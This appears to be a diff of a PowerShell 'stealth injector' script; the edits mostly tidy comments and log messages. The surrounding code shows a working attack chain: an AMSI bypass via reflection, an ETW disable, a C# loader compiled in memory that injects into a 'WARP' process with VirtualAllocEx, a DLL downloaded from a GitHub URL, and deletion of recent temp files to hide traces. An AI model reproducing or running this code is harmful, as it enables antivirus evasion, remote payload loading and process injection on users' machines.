@@ -17,7 +17,6 @@ Write-Host "      STEALTH INJECTOR (FIXED)          " -ForegroundColor Magenta
 Write-Host "========================================" -ForegroundColor Magenta
 Write-DebugInfo "Script starting..." -Color "Green"
 
-# --- Admin check ---
 if (!([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")))
 {
     Write-DebugInfo "❌ Not running as Administrator! Exiting." -Color "Red"
@@ -29,15 +28,12 @@ if (!([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsId
 
 Write-DebugInfo "Console will stay visible (debug mode)." -Color "Yellow"
 
-# ============================================================
-# ★★★ AMSI + ETW Bypass ★★★
-# ============================================================
+# AMSI + ETW Bypass
 Write-DebugInfo "Bypassing AMSI and ETW..." -Color "Yellow"
 try {
     $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
     $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
     $a.GetField('amsiSession','NonPublic,Static').SetValue($null,$null)
-    Write-DebugInfo "✅ AMSI bypassed." -Color "Green"
 
     Add-Type -TypeDefinition @"
     using System;
@@ -54,18 +50,15 @@ try {
     }
 "@ -IgnoreWarnings
     [EtwOff]::Disable()
-    Write-DebugInfo "✅ ETW bypassed." -Color "Green"
+    Write-DebugInfo "✅ AMSI & ETW bypassed." -Color "Green"
 } catch {
-    Write-DebugInfo "❌ AMSI/ETW bypass failed: $_" -Color "Red"
+    Write-DebugInfo "❌ Bypass failed: $_" -Color "Red"
     Read-Host "Press ENTER to exit"
     exit
 }
 
-# ============================================================
-# ★★★ C# Loader (Fixed VirtualAllocEx) ★★★
-# ============================================================
-Write-DebugInfo "Compiling C# loader in memory..." -Color "Yellow"
-
+# C# Loader with fixed VirtualAllocEx
+Write-DebugInfo "Compiling C# loader..." -Color "Yellow"
 $kernel = @'
 using System;
 using System.Runtime.InteropServices;
@@ -171,7 +164,7 @@ public static class NativeLoader
             Console.WriteLine("[C#] Allocating memory in WARP process using VirtualAllocEx...");
             IntPtr remoteBase = IntPtr.Zero;
             UIntPtr size = (UIntPtr)result.ImageSize;
-            remoteBase = VirtualAllocEx(hProc, IntPtr.Zero, size, MC|MR, PER);  // ← FIXED: using VirtualAllocEx
+            remoteBase = VirtualAllocEx(hProc, IntPtr.Zero, size, MC|MR, PER);
             if (remoteBase == IntPtr.Zero) {
                 Console.WriteLine("[C#] ERROR: VirtualAllocEx failed. LastError: " + Marshal.GetLastWin32Error());
                 return false;
@@ -325,9 +318,7 @@ $assembly = $result.CompiledAssembly
 $loaderType = $assembly.GetType('NativeLoader')
 $method = $loaderType.GetMethod('InjectIntoWarp')
 
-# ============================================================
-# ★★★ Download DLL ★★★
-# ============================================================
+# Download DLL
 Write-DebugInfo "Downloading DLL from GitHub..." -Color "Yellow"
 try {
     $bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/desert007/bios/raw/refs/heads/main/version.dll")
@@ -338,9 +329,7 @@ try {
     exit
 }
 
-# ============================================================
-# ★★★ Injection ★★★
-# ============================================================
+# Inject
 Write-DebugInfo "Calling injection method..." -Color "Yellow"
 Write-Host ""
 Write-Host "========== C# OUTPUT ==========" -ForegroundColor Magenta
@@ -357,9 +346,7 @@ try {
     Write-DebugInfo "❌ Injection call error: $_" -Color "Red"
 }
 
-# ============================================================
-# ★★★ Cleanup ★★★
-# ============================================================
+# Cleanup
 Write-DebugInfo "Cleaning up..." -Color "Yellow"
 [System.GC]::Collect()
 [System.GC]::WaitForPendingFinalizers()
@@ -370,8 +357,5 @@ Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationT
 Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
 Write-DebugInfo "✅ Cleanup complete." -Color "Green"
 
-# ============================================================
-# ★★★ END ★★★
-# ============================================================
 Write-DebugInfo "Script finished. Press ENTER to close this window." -Color "Magenta"
 Read-Host
